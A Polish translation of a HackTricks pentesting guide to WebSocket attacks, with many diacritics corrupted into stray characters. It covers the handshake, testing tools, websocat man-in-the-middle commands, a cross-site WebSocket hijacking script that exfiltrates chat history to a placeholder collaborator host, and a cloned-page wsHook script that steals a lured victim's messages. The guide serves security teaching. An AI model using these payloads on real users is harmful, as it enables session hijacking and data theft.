# Ataki na WebSockety

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Czym s WebSockety

Poczenia WebSocket s nawizywane poprzez pocztkowy ucisk doni **HTTP** i s zaprojektowane tak, aby byy **dugotrwae**, umo偶liwiajc dwukierunkow komunikacj w dowolnym momencie bez koniecznoci posiadania systemu transakcyjnego. Dziki temu WebSockety s szczeg贸lnie korzystne dla aplikacji wymagajcych **niskiego op贸藕nienia lub komunikacji inicjowanej przez serwer**, takich jak strumienie danych finansowych na 偶ywo.

### Nawizywanie pocze WebSocket

Szczeg贸owe wyjanienie nawizywania pocze WebSocket mo偶na znale藕 [**tutaj**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). W skr贸cie, poczenia WebSocket s zwykle inicjowane za pomoc JavaScriptu po stronie klienta, jak pokazano poni偶ej:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
Protok贸 `wss` oznacza poczenie WebSocket zabezpieczone protokoem **TLS**, podczas gdy `ws` oznacza **niezabezpieczone** poczenie.

Podczas nawizywania poczenia, midzy przegldark a serwerem odbywa si proces ustanawiania poczenia, kt贸ry odbywa si za pomoc protokou HTTP. Proces ten polega na wysaniu 偶dania przez przegldark, a nastpnie odpowiedzi serwera, jak to przedstawiono w poni偶szych przykadach:

Przegldarka wysya 偶danie ustanowienia poczenia:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Odpowied藕 serwera na handshake:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Po nawizaniu poczenia, komunikacja midzy stronami odbywa si w obie strony.

**Kluczowe punkty podczas negocjacji WebSocket:**

- Nag贸wki `Connection` i `Upgrade` sygnalizuj rozpoczcie negocjacji WebSocket.
- Nag贸wek `Sec-WebSocket-Version` wskazuje 偶dan wersj protokou WebSocket, zwykle `13`.
- W nag贸wku `Sec-WebSocket-Key` wysyana jest losowa warto zakodowana w Base64, zapewniajca unikalno ka偶dej negocjacji i pomagajca zapobiega problemom z proxy cache. Ta warto nie su偶y do uwierzytelniania, ale do potwierdzenia, 偶e odpowied藕 nie zostaa wygenerowana przez 藕le skonfigurowany serwer lub cache.
- Nag贸wek `Sec-WebSocket-Accept` w odpowiedzi serwera to suma kontrolna `Sec-WebSocket-Key`, potwierdzajca intencj serwera otwarcia poczenia WebSocket.

Te funkcje zapewniaj bezpieczny i niezawodny proces negocjacji, umo偶liwiajc efektywn komunikacj w czasie rzeczywistym.


### Konsola Linux

Mo偶esz u偶y `websocat`, aby nawiza surowe poczenie z WebSocketem.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Aby utworzy serwer websocat:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### Ataki typu MitM na poczenia websocket

Jeli zauwa偶ysz, 偶e klienci s podczeni do **websocketu HTTP** z twojej obecnej lokalnej sieci, mo偶esz spr贸bowa przeprowadzi [Atak ARP Spoofing](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing), aby przeprowadzi atak typu MitM midzy klientem a serwerem.\
Gdy klient pr贸buje si poczy, mo偶esz u偶y:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Wyliczanie Websockets

Mo偶esz u偶y **narzdzia** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **do automatycznego odkrywania, identyfikowania i wyszukiwania znanych** **podatnoci** w websockets.

### Narzdzia do debugowania Websocket

* **Burp Suite** obsuguje komunikacj websockets w spos贸b bardzo podobny do komunikacji HTTP.
* Rozszerzenie [**socketsleuth**](https://github.com/snyk/socketsleuth) dla Burp Suite pozwoli Ci lepiej zarzdza komunikacj Websocket w Burp, pobiera **histori**, ustawia **reguy przechwytywania**, u偶ywa regu **dopasowania i zamiany**, korzysta z **Intrudera** i **AutoRepeater**.
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** Skr贸t od "**WebSocket/Socket.io Proxy**", narzdzie napisane w Node.js, kt贸re zapewnia interfejs u偶ytkownika do **przechwytywania, przechwytywania**, wysyania **niestandardowych** wiadomoci i przegldania wszystkich komunikacji WebSocket i Socket.IO midzy klientem a serwerem.
* [**wsrepl**](https://github.com/doyensec/wsrepl) to **interaktywne REPL websocket** zaprojektowane specjalnie do test贸w penetracyjnych. Zapewnia interfejs do obserwowania **przychodzcych wiadomoci websocket i wysyania nowych**, z atwym w u偶yciu frameworkiem do **automatyzacji** tej komunikacji.
* [**https://websocketking.com/**](https://websocketking.com/) to **strona internetowa do komunikacji** z innymi stronami internetowymi za pomoc **websockets**.
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) opr贸cz innych typ贸w komunikacji/protoko贸w, zapewnia **stron internetow do komunikacji** z innymi stronami internetowymi za pomoc **websockets**.

## Laboratorium Websocket

W [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) znajdziesz kod do uruchomienia strony internetowej za pomoc websockets, a w [**tym pocie**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) znajdziesz wyjanienie.

## Przechwytywanie WebSocket Cross-site (CSWSH)

**Przechwytywanie WebSocket Cross-site**, znane r贸wnie偶 jako **przechwytywanie WebSocket Cross-origin**, jest okrelane jako szczeg贸lny przypadek **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** dotyczcy negocjacji WebSocket. Podatno ta wystpuje, gdy negocjacje WebSocket uwierzytelniaj si wycznie za pomoc **ciasteczek HTTP**, bez token贸w CSRF lub podobnych rodk贸w bezpieczestwa.

Atakujcy mog wykorzysta to, hostujc **zoliw stron internetow**, kt贸ra inicjuje poczenie WebSocket midzy witryn a podatn aplikacj. W rezultacie to poczenie jest traktowane jako cz sesji ofiary z aplikacj, wykorzystujc brak ochrony CSRF w mechanizmie obsugi sesji.

### Prosty atak

Nale偶y zauwa偶y, 偶e podczas **ustanawiania** poczenia **websocketowego**, **ciasteczko** jest **wysyane** do serwera. Serwer mo偶e go u偶ywa do **powizania** ka偶dego **konkretnego u偶ytkownika** z jego **sesj websocketow na podstawie wysanego ciasteczka**.

Nastpnie, jeli na przykad **serwer websocketowy wysya histori rozmowy** u偶ytkownika, jeli zostanie wysana wiadomo z "**READY"**, to **proste XSS** ustanawiajce poczenie (ciasteczko zostanie **automatycznie wysane**, aby autoryzowa u偶ytkownika ofiar) **wysyajc** "**READY**" bdzie w stanie **odzyska** histori **rozmowy**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie z inn subdomen

W tym wpisie na blogu [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) atakujcy zdoa **wykona dowolny kod JavaScript w subdomenie** domeny, w kt贸rej odbywaa si komunikacja za pomoc gniazd sieciowych. Poniewa偶 bya to **subdomena**, **cookie** byo **wysyane**, a poniewa偶 **Websocket nie sprawdza poprawnie pochodzenia**, byo mo偶liwe komunikowanie si z nim i **kradzie偶 token贸w**.

### Kradzie偶 danych od u偶ytkownika

Skopiuj aplikacj internetow, kt贸r chcesz podszy (np. pliki .html) i wewntrz skryptu, w kt贸rym odbywa si komunikacja za pomoc gniazd sieciowych, dodaj ten kod:
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
Teraz pobierz plik `wsHook.js` z [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) i **zapisz go wewntrz folderu z plikami internetowymi**.\
Ujawniajc aplikacj internetow i zmuszajc u偶ytkownika do poczenia si z ni, bdziesz w stanie kra wysane i otrzymane wiadomoci za pomoc protokou websocket:
```javascript
sudo python3 -m http.server 80
```
## Wycig warunk贸w

Wycigi warunk贸w w WebSockets r贸wnie偶 s mo偶liwe, [sprawd藕 te informacje, aby dowiedzie si wicej](race-condition.md#rc-in-websockets).

## Inne podatnoci

Poniewa偶 WebSockets s mechanizmem do **wysyania danych po stronie serwera i klienta**, w zale偶noci od tego, jak serwer i klient obsuguj informacje, **WebSockets mog by wykorzystane do eksploatacji innych podatnoci, takich jak XSS, SQLi lub inne powszechne podatnoci internetowe, u偶ywajc danych wprowadzonych przez u偶ytkownika za porednictwem WebSockets**.

## **WebSocket Smuggling**

Ta podatno mo偶e umo偶liwi **ominicie ogranicze odwr贸conych proxy** przez sprawienie, 偶e uwierz one, 偶e **nawizano komunikacj WebSocket** (nawet jeli tak nie jest). To mo偶e umo偶liwi atakujcemu **dostp do ukrytych punkt贸w kocowych**. Aby uzyska wicej informacji, sprawd藕 nastpujc stron:

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## Odwoania

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy **reklam swojej firmy w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
